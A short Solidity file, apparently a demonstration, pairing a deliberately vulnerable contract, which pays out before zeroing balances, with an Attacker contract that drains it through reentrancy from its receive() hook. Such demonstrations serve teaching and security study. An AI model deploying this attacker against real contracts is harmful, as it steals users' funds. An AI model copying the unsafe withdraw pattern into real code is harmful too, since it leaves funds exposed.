// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract Vulnerable{

    mapping(address=>uint) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() public{
        uint256 bal = balances[msg.sender];
        require(bal>0,"Insufficient balance to withdraw");
        (bool sent,) = msg.sender.call{value:bal}("");
        require(sent,"failure");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}


contract Attacker{
    Vulnerable public v;

    constructor(address vuln){
        v = Vulnerable(vuln);
    }

    function attack() public payable{
        require(msg.value>=1 ether);
        v.deposit{value:1 ether}();
        v.withdraw();
    }

    receive() external payable{
        if(address(v).balance>=1 ether){
            v.withdraw();
        }
    }
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
